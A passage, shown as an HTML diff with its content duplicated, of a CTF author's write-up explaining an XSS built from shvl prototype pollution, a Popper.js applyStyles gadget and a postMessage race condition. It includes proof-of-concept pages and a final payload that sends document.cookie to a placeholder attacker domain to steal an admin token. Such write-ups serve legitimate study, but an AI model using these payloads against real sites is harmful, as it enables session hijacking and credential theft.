-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Javascript" data-lang="Javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">applyStyles</span>({ <span style="color:#a6e22e">state</span> }<span style="color:#f92672">:</span> <span style="color:#a6e22e">ModifierArguments</span><span style="color:#f92672">&lt;</span>{<span style="color:#f92672">||</span>}<span style="color:#f92672">&gt;</span>) {
-  <span style="color:#75715e">// Iterate over reference and popper
-</span><span style="color:#75715e"></span>  Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">elements</span>).<span style="color:#a6e22e">forEach</span>((<span style="color:#a6e22e">name</span>) =&gt; { 
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">style</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">styles</span>[<span style="color:#a6e22e">name</span>] <span style="color:#f92672">||</span> {};
-
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">attributes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">attributes</span>[<span style="color:#a6e22e">name</span>] <span style="color:#f92672">||</span> {};
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">element</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">elements</span>[<span style="color:#a6e22e">name</span>];
-
-    ...
-
-    <span style="color:#75715e">// Iterate over its properties!
-</span><span style="color:#75715e"></span>    Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">attributes</span>).<span style="color:#a6e22e">forEach</span>((<span style="color:#a6e22e">name</span>) =&gt; {
-      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">attributes</span>[<span style="color:#a6e22e">name</span>];
-      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">value</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
-        <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">removeAttribute</span>(<span style="color:#a6e22e">name</span>);
-      } <span style="color:#66d9ef">else</span> {
-        <span style="color:#75715e">// Set them as attributes if it exists
-</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">value</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">value</span>); 
-      }
-    });
-  });
-}
-</code></pre></div><p>The following code should be enough to get XSS by combining the <a href="https://github.com/robinvdvleuten/shvl">shvl</a> prototype pollution and <a href="https://github.com/popperjs/popper-core">Popper.js</a> <code>applyStyles</code> gadget by oppening it as <code>/poc.html#send-button</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML"><span style="color:#75715e">&lt;!-- poc.html --&gt;</span>
-&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/shvl@2.0.3/dist/shvl.umd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
-&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/@popperjs/core@2.9.2/dist/umd/popper.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
-
-&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;send-button&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ui-button text&#34;</span>&gt;send&lt;/<span style="color:#f92672">button</span>&gt;
-&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;send-tooltip&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tooltip&#34;</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tooltip&#34;</span>&gt;
-
-&lt;<span style="color:#f92672">script</span>&gt;
-    <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {}
-    <span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#e6db74">&#34;__proto__.reference.onfocus&#34;</span>, <span style="color:#e6db74">&#34;alert(document.domain)&#34;</span>);
-
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">button</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-button&#39;</span>);
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tooltip</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-tooltip&#39;</span>);
-
-    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">popperInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Popper</span>.<span style="color:#a6e22e">createPopper</span>(<span style="color:#a6e22e">button</span>, <span style="color:#a6e22e">tooltip</span>, {
-        <span style="color:#a6e22e">placement</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;bottom&#39;</span>,
-        <span style="color:#a6e22e">modifiers</span><span style="color:#f92672">:</span> [
-            {
-                <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;offset&#39;</span>,
-                <span style="color:#a6e22e">options</span><span style="color:#f92672">:</span> {
-                    <span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>],
-                },
-            },
-        ],
-    });
-&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p>This gadget is not so difficult to find out when debugging. Because of that, while talking to <a href="https://twitter.com/k33r0k">@k33r0k</a>, discussing gadgets and how to make this challenge a bit harder, he proposed the implementation of a <code>postMessage</code> race condition to increase one step as there are many prototype pollution scanners available on the internet. And I made it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">__debug_loops__</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">index</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">orderedModifiers</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">index</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__DEV__</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">__debug_loops__</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__debug_loops__</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">INFINITE_LOOP_ERROR</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">reset</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">reset</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">index</span> <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">fn</span>, <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {}, <span style="color:#a6e22e">name</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">orderedModifiers</span>[<span style="color:#a6e22e">index</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">fn</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">state</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fn</span>({ <span style="color:#a6e22e">state</span>, <span style="color:#a6e22e">options</span>, <span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">instance</span> }) <span style="color:#f92672">||</span> <span style="color:#a6e22e">state</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In this snippet, all modifiers are going to be called in the line <code>state = fn({ state, options, name, instance }) || state;</code>. One of them is <a href="https://popper.js.org/docs/v2/modifiers/apply-styles/">applyStyles</a>, which allow users to set custom attributes to the elements used by the <a href="https://github.com/popperjs/popper-core">Popper</a>. These elements are passed by parameter to the <code>createPopper</code> and defined as <code>state.elements</code> Object <a href="https://github.com/popperjs/popper-core/blob/master/src/createPopper.js#L57">in these lines</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span>)<span style="color:#f92672">:</span> <span style="color:#a6e22e">Instance</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">state</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">$Shape</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">State</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">placement</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;bottom&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">orderedModifiers</span><span style="color:#f92672">:</span> [],
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">options</span><span style="color:#f92672">:</span> { ...<span style="color:#a6e22e">DEFAULT_OPTIONS</span>, ...<span style="color:#a6e22e">defaultOptions</span> },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">modifiersData</span><span style="color:#f92672">:</span> {},
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">elements</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">reference</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">popper</span>,
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">attributes</span><span style="color:#f92672">:</span> {},
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">styles</span><span style="color:#f92672">:</span> {},
+</span></span><span style="display:flex;"><span>    };
+</span></span></code></pre></div><p>When <code>applyStyles</code> function executes, it iterates over <code>state.elements</code>. Moreover, for any of them, it iterates again over its attributes! For any attribute with a value defined in the object, <code>setAttribute</code> is called and adds it to the final element in the DOM. Since <code>createPopper</code> received two elements reference (the button in which <a href="https://github.com/popperjs/popper-core">Popper</a> is enrolled) and the <a href="https://github.com/popperjs/popper-core">Popper</a> itself (a div), it is possible to insert properties into both elements by polluting <code>Object.prototype.reference.property</code> and <code>Object.prototype.popper.property</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">applyStyles</span>({ <span style="color:#a6e22e">state</span> }<span style="color:#f92672">:</span> <span style="color:#a6e22e">ModifierArguments</span><span style="color:#f92672">&lt;</span>{<span style="color:#f92672">||</span>}<span style="color:#f92672">&gt;</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Iterate over reference and popper
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">elements</span>).<span style="color:#a6e22e">forEach</span>((<span style="color:#a6e22e">name</span>) =&gt; { 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">style</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">styles</span>[<span style="color:#a6e22e">name</span>] <span style="color:#f92672">||</span> {};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">attributes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">attributes</span>[<span style="color:#a6e22e">name</span>] <span style="color:#f92672">||</span> {};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">element</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">elements</span>[<span style="color:#a6e22e">name</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Iterate over its properties!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">attributes</span>).<span style="color:#a6e22e">forEach</span>((<span style="color:#a6e22e">name</span>) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">attributes</span>[<span style="color:#a6e22e">name</span>];
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">value</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">removeAttribute</span>(<span style="color:#a6e22e">name</span>);
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Set them as attributes if it exists
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">value</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">value</span>); 
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The following code should be enough to get XSS by combining the <a href="https://github.com/robinvdvleuten/shvl">shvl</a> prototype pollution and <a href="https://github.com/popperjs/popper-core">Popper.js</a> <code>applyStyles</code> gadget by oppening it as <code>/poc.html#send-button</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- poc.html --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/shvl@2.0.3/dist/shvl.umd.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/@popperjs/core@2.9.2/dist/umd/popper.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;send-button&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ui-button text&#34;</span>&gt;send&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;send-tooltip&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tooltip&#34;</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tooltip&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">shvl</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#e6db74">&#34;__proto__.reference.onfocus&#34;</span>, <span style="color:#e6db74">&#34;alert(document.domain)&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">button</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-button&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tooltip</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#send-tooltip&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">popperInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Popper</span>.<span style="color:#a6e22e">createPopper</span>(<span style="color:#a6e22e">button</span>, <span style="color:#a6e22e">tooltip</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">placement</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;bottom&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">modifiers</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;offset&#39;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">options</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">offset</span><span style="color:#f92672">:</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>],
+</span></span><span style="display:flex;"><span>                },
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>This gadget is not so difficult to find out when debugging. Because of that, while talking to <a href="https://twitter.com/k33r0k">@k33r0k</a>, discussing gadgets and how to make this challenge a bit harder, he proposed the implementation of a <code>postMessage</code> race condition to increase one step as there are many prototype pollution scanners available on the internet. And I made it.</p>
 <p>In order to control what <a href="https://github.com/robinvdvleuten/shvl">shvl</a> would parse, we need to send a <code>postMessage</code> to the page <strong>before</strong> it receives the content from its inner iframe. The following code should do that (but may require refreshing the page if it looses the race):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML"><span style="color:#75715e">&lt;!-- thanks k33r0k --&gt;</span>
-&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://small-talk.coach/&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-
-&lt;<span style="color:#f92672">script</span>&gt;
-    <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
-        window.<span style="color:#a6e22e">frames</span>[<span style="color:#e6db74">&#34;page&#34;</span>].<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;{&#34;author&#34;: &#34;@vrechson&#34;, &#34;message&#34;: &#34;hack the planet!&#34;}&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
-    }, <span style="color:#ae81ff">0</span>);
-&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p>Combining all these steps, the player should be able to steal steal the admin token through the following payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;height: 500px&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://small-talk.coach:1337/#send-button&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
-
-&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;my-input&#34;</span> <span style="color:#a6e22e">autofocus</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;
-&lt;<span style="color:#f92672">script</span>&gt;
-    <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
-        window.<span style="color:#a6e22e">frames</span>[<span style="color:#e6db74">&#34;page&#34;</span>].<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;{&#34;__proto__.reference.onblur&#34;: &#34;location=`https://your.domain/${document.cookie}`&#34;, &#34;message&#34;: &#34;hack the planet!&#34;}&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
-    }, <span style="color:#ae81ff">0</span>);
-&lt;/<span style="color:#f92672">script</span>&gt;
-&lt;<span style="color:#f92672">script</span>&gt;
-    <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
-        <span style="color:#a6e22e">oi</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#my-input&#39;</span>);
-        <span style="color:#a6e22e">oi</span>.<span style="color:#a6e22e">focus</span>();
-    }, <span style="color:#ae81ff">700</span>)
-&lt;/<span style="color:#f92672">script</span>&gt;
-</code></pre></div><p>After the CTF, I could see that some players solved it by using the pooper payload and that <a href="https://twitter.com/s1r1us">@s1r1us</a> found a gadget using <code>pooper.arrow</code>!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- thanks k33r0k --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://small-talk.coach/&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">frames</span>[<span style="color:#e6db74">&#34;page&#34;</span>].<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;{&#34;author&#34;: &#34;@vrechson&#34;, &#34;message&#34;: &#34;hack the planet!&#34;}&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Combining all these steps, the player should be able to steal steal the admin token through the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;page&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;height: 500px&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://small-talk.coach:1337/#send-button&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;my-input&#34;</span> <span style="color:#a6e22e">autofocus</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">frames</span>[<span style="color:#e6db74">&#34;page&#34;</span>].<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;{&#34;__proto__.reference.onblur&#34;: &#34;location=`https://your.domain/${document.cookie}`&#34;, &#34;message&#34;: &#34;hack the planet!&#34;}&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>);
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">oi</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#my-input&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">oi</span>.<span style="color:#a6e22e">focus</span>();
+</span></span><span style="display:flex;"><span>    }, <span style="color:#ae81ff">700</span>)
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>After the CTF, I could see that some players solved it by using the pooper payload and that <a href="https://twitter.com/s1r1us">@s1r1us</a> found a gadget using <code>pooper.arrow</code>!</p>
 <p>I&rsquo;d like to thank everyone from ELT and Pwn2win organization. I hope that everyone had fun playing this CTF!</p>
 </div>
 
